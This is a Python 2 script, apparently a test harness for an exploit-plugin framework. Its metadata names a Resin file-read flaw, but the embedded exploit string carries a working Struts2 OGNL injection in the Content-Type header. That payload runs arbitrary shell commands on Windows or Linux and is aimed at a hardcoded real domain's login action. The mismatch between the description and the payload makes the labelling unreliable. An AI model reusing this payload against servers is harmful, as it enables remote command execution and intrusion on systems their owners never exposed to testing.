#!/usr/bin/env python
# -*- coding:utf-8 -*-
import re
import urlparse,curl

'''
	Name = 'Resin viewfile远程文件读取漏洞'
	Description = 'Resin viewfile远程文件读取漏洞'
	Product = 'Resin'
	References = ''
	DisclosureDate = ''
	MapXQuery = 'tag="Resin"'
'''

str = """
def exploit():

    import urllib2
    import sys
    from poster.encode import multipart_encode
    from poster.streaminghttp import register_openers
    register_openers()


    # 漏洞是否存在
    status = False
    # 漏洞执行返回的唯一值
    keyword = ""
    cmd = "echo 12309"
    datagen, header = multipart_encode({"image1": ''})
    header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+cmd+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    request = urllib2.Request("http://www.tongdow.com/loginUI.action",datagen,headers=header)
    response = urllib2.urlopen(request)
    html = response.read()
    print html
    if html == "12309":
        status = True
        keyword = html
"""

# object = {}
# exec(str,object)
# print object.get("exploit").keys()
# print object.exploit.get("status")
# print object.exploit.get("keyword")

a = """
def exploit(target):
    print target
    # 漏洞是否存在
    status = False
    # 漏洞执行返回的唯一值
    keyword = "keyword"
    return status,keyword
status,keyword = exploit(target)
"""

code = compile(a, '<string>', 'exec')
runtime = {"target":6666}
exec code in runtime
print runtime["status"]
print runtime["keyword"]